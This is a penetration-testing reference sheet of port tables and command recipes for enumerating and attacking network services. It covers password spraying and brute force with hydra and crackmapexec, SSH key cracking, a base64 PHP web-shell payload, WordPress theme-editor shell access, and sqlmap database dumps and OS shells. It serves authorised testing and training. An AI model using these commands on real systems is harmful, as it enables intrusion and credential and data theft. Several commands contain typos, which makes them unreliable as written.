|||
|---|---|
|Port(s)|Service|
|21|FTP|
|22|SSH|
|23|Telnet|
|25|SMTP (mail)|
|587|secure SMTP|
|53 (UDP)|DNS|
|67 (UDP) and 68 (UDP)|DHCP|
|69 (UDP)|TFTP|
|80|HTTP|
|443|HTTPS|
|110|POP3 (mail)|
|111|ONC RPC|
|143|IMAP (mail)|
|161 (UDP)|SNMP|
|139 and 445|SMB|
|1433|MSSQL|
|1978|WiFi Mouse|
|2049|NFS|
|3306|MySQL|
|3389|Windows Remote Desktop (RDP)|
|5900|VNC|
|5985|WinRM HTTP|
|5986|WinRM HTTPS|

Most common Active Directory (AD) services and their ports:

|||
|---|---|
|Port(s)|Service|
|53|DNS|
|88|Kerberos Authentication|
|135|WMI RPC|
|138, 139, and 445|SMB|
|389|LDAP|
|636|LDAPS|
|5355|LLMNR|
|8530 and 8531|WSUS|

- Indicators of Domain Controller: ports 53, 88, 389 (LDAP), 636 (LDAPS)

	- %SYSTEMROOT%\NTDS\NTDS.dit has all information and user password hashes
### ARP SCAN
```
arp-scan -l <RANGE>
```
```
netdiscover -r <RANGE>
```
### FTP
- download all files
```
wget -m ftp://[USERNAME]:[PASSWORD]@[HOST]
```
- Connect
```
ftp <HOST>
```
```
ftp <USERNAME>@<HOST>
```
### SSH
- Connect
```
ssh <DOMAIN>\\<USERNAME>@<HOST> -p <PORT>
```
- Password Spray
```
hydra -l <USERNAME> -P <PASSWORD_LIST> -s <PORT> ssh://<HOST>
```
- Use id_rsa or id_ecdsa file
```
chmod 600 id_rsa/id_ecdsa
```
```
ssh <USERNAME>@<TARGET> -i id_rsa/id_ecdsa #if it still asks for a password crack it with john
```
- Cracking id_rsa or id_ecdsa with john
```
ssh2john id_ecdsa/id_rsa > hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### SMTP
```
nmap -p25, --script smtp-open-relay <HOST>
```
```
ismtp -h <HOST>:25 -e <WORDLIST> -l 3
```
```
smtp-useer-enum -M <MODE> (VRFY, EXPN, RCPT) -U <WORDLIST> -t <HOST> #Example wordlist /usr/share/metasploit-framework/data/wordlists/unix_users.txt
```
```
sendmail -s <HOST> -xu <USERNAME> -xp <PASSWORD> -f <FROM> -t <TO> -u <SUBJECT> -m <MESSAGE> -a <ATTACHMENT>
```
```
swaks --server <HOST> -au <USERNAME> -ap <PASSWORD> -f <FROM> -t <TO> --h-subject <SUBJECT> --body <MESSAGE> --attach @<ATTACHMENT> -n
```
### SNMP
```
hydra -P <WORDLIST> -v <HOST> snmp
```
```
snmp-check -c [community string] <IP>
```
```
snmpwalk -c [community string] -v <VERSION> <HOST> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```
- User friendly version of snmpwalk
```
snmpcheck -t <IP> -c [community string]
```
- View the entire MIB Tree
```
snmpwalk -c [community string] -v <VERSION (1 or 2c)>
```
- View a specific MIB parameter
```
snmpwalk -c [community string] -v <VERSION> <HOST> <IDENTIFIER>
```
- Windows User enumeration
```
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
```
- Windows Processes enumeration
```
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2
```
- Installed software enumeration
```
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2
```
- Opened TCP ports enumeration
```
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3
```
- MIB Identifiers
```
System Processes: 	1.3.6.1.2.1.25.1.6.0
Running Programs: 	1.3.6.1.2.1.25.4.2.1.2
Processes Paths: 	1.3.6.1.2.1.25.4.2.1.4
Storage Units: 	1.3.6.1.2.1.25.2.3.1.4
Software Names: 	1.3.6.1.2.1.25.6.3.1.2
User Accounts: 	1.3.6.1.4.1.77.1.2.25
TCP Local Ports: 	1.3.6.1.2.1.6.13.1.3
```
### SMB
```
nbtscan -r <RANGE>
```
```
enum4linux -v -a <HOST>
```
```
crackmapexec smb <HOST> -u <USERNAME> -p <PASSWORD> --rid-brute
```
- SMBMap
	- -r recursive 
	- --depth [depth] traverses the directory to a specific depth default is 5
	- -u [username]
	- -p [password]
	- -x [command] executes a command
	- -s [share] enumerates a share
	- -d [domain] enumerates a domain
	- --download [file] downloads a file
	- --upload [file] uploads a file
```
smbmap -H <HOST>
```
- SMBClient
	- -L [host] lists shares
	- -I [IP]
	- -D [directory]
	- -U [domain]/[username%[password]]
	- -N don't use a password
	- -c [command]
```
smbclient -N -L //<HOST>
```
```
smbclient //<HOST>/<SHARE>
```
```
# To get all files recursively
mask ""
recurse ON
prompt OFF
mget *
```
- SMBGet
	- Download all files
```
smbget -R smb://<HOST>/<DISK>
```
- Bruteforce SMB
```
crackmapexec smb <HOST> -u <USER/USERS/USER_FILE> -p <PASSWORD/PASSWORDS/PASSWORD_FILE> --continue-on-success
```
### Port Scanning in powershell
- Test one port
```
Test-NetConnection -Port <PORT> <IP>
```
- Automating port scan of first 1024 ports
```
1..1024 | % {echo ((New-Object Net.sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null
```
### HTTP/S
- View source code
- identify version or CMS and check active exploits
- check robots.txt
- look for hostname and add relevant one to /etc/hosts file
- Look at PHP wrappers
```
php://filter/resource=[file].php ⇒ display contents of PHP file
php://filter/convert.base64-encode/resource=[file].php

data://text/plain,<?php[code]?> ⇒ run PHP code
data://text/plain;base64,[base64] ⇒ run base 64 encoded PHP code
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```
- Directory and file discovery
```
gobuster dir -u <URL> -w <WORDLIST_FILE>
```
```
python3 dirsearch.py -u <URL> -w <WORDLIST_FILE>
```
```
gobuster dir -u <URL> -x pdf,txt,php -w <WORDLIST_FILE>
```
```
gobuster dir -u <URL> -x <FILE_EXTENSIONS> -w <WORDLIST> -U <AUTH_USERNAME> -P <AUTH_PASSWORD> -s <INVALID_STATUS_CODES> -t <NUMBER_OF_THREADS>
```
```
ffuf -w <WORDLIST> -u http://<TARGET>/FUZZ
```
```
fuff -w <WORDLIST> -u http://<TARGET>/FUZZ -e .aspx,.html,.php,.txt,.pdf -recursion
```
- Vulnerability scanning
```
nikto -h <URL>
```
- If cgi-bin is present do further fuzzing and obtain files like .sh or .pl
- Check to see if other services like FTP or SMB that you have upload privileges on are being reflected on the web
- API Fuzzing can reveal sensitive information
- Identifying endpoints with gobuster
```
gobuster dir -u <URL> -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example but it can be anything
```
- Interesting information via curl
```
curl -i <URL>
```
- If there is an input field check for RCE or SQL injection
- Check the URL to see if you can leverage LFI/RFI
- Check for file upload utilities
#### Wordpress
- Basic usage
```
wpscan --url <URL> --verbose
```
- enumerate vulnerable plugins, users, vulnerable themes, timthumbs
```
wpscan --url <URL> --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
```
- Add wpscan API to get the details of vulnerabilities
```
wpscan --url <URL> --api-token <API_TOKEN>
```
- Other scans
```
wpscan --url <URL> 0e vp,vt --detection-mode aggressive -v --api-token <API_TOKEN>
```
- Accessing wordpress shell
```
http://<IP>/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
```
```
http://<IP>/retro/wp-content/themes/90s-retro/404.php
```
#### Drupal
- Scanning
```
droopescan scan drupal -u <URL>
```
#### Joomla
```
droopescan scan joomla --url <URL>
```
```
sudo python3 joomla-brute.py -u <URL> -w passwords.txt -usr <USERNAME> #https://github.com/ajnik/joomla-bruteforce
```
### DNS
- host
```
host <DOMAIN>
```
- host mail records
```
host -t mx <DOMAIN>
```
- host text records
```
host -t txt <DOMAIN>
```
- DNS bruteforce
```
for ip in $(cat list.txt); do host $ip.<DOMAIN>; done
```
- DNS bruteforcer to find domain name
```
for ip in $(seq 200-254); do host 51.222.169/$ip; done | grep -v "not found"
```
- DNS Recon standard
```
dnsrecon -d <DOMAIN> -t std
```
- DNS Recon bruteforce with list we provided
```
dnsrecon -d <DOMAIN> -D <FILE> -t brt
```
- DNS bruteforce using dnsenum
```
dnsenum <DOMAIN>
```
- NSLookup
```
nslookup <DOMAIN>
```
```
nslookup -type=TXT <DOMAIN> <IP>
```
- Subdomains
```
theharvester -d <DOMAIN> -b <SEARCH_ENGINE>
```
```
amass enum -passive -src -d <DOMAIN>
```
```
amass enum -active -d <DOMAIN>
```
```
cat <FILE_WITH_DOMAINS> | httprobe
```
```
fuff -w <WORDLIST> -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>"
```
- Gobuster
```
gobuster dns -d <DOMAIN> -w <WORDLIST> -t <NUMBER_OF_THREADS>
```
### LDAP
- Try on ldap and ldaps with this command first if you don't have any valid credentials
```
ldapsearch -x -H ldap://<IP>:<PORT>
```
```
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```
- Use CN name to describe the info you're collecting
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
- Windapsearch.py for computers
```
python3 windapsearch.py --dc-ip <IP> -u <USERNAME> -p <PASSWORD> --computers
```
- windapsearch.py for groups
```
python3 windapsearch.py --dc-ip <IP> -u <USERNAME> -p <PASSWORD> --groups
```
- windapsearch.py for users
```
python3 windapsearch.py --dc-ip <IP> -u <USERNAME> -p <PASSWORD> --da
```
- windapsearch.py for privileged users
```
python3 windapsearch.py --dc-ip <IP> -u <USERNAME> -p <PASSWORD> --privileged-users
```
### NFS
- Enumeration
```
nmap -sV --script=nfs-showmount <IP>
```
- connect
```
showmount -e <IP>
```
### RPC
```
rpcclient -U=user <IP>
```
- Anonymous login
```
rpcclient -u="" <IP>
```
- Commands within RPCClient
```
srvinfo
enumdomusers #users
enumpriv #similar to whoami /priv
queryuser <USER> #gives detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <USER> #SID of specified user
createdomuser <USERNAME> #Creates a user
deletedomuser <USERNAME> #Deletes the user
enumdomains
enumdomgroups
querygroup <group-RID> #get RID from previous command
querydispinfo # Description of all users
netshareenum #Share enumeration and only comes up if the current user you are logged in with has permissions
netshareenumall
lsaenumsid #SID of all users
```
### SQLMap
- Check all pages for injectability
```
sqlmap -u <URL> --crawl=1
```
- Get current user
```
sqlmap -u <URL> --current-user
```
- Get databases
```
sqlmap -u <URL> --dbs
```
- Get current database
```
sqlmap -u <URL> --current-database
```
- Get all data from database
```
sqlmap -u <URL> --dump --threads=<NUMBER_OF_THREADS>
```
- Get tables
```
sqlmap -u <URL> -D <DATABASE> --tables
```
- Get columns
```
sqlmap -u <URL> -D <DATABASE> -T <TABLE> --columns
```
- Get a dump
```
sqlmap -u <URL> -D <DATABASE> -T <TABLE> -C <COLUMNS (can be separated by ,)> --dump
```
- Attempt to get a shell on target
```
sqlmap -u <URL> --os-shell
```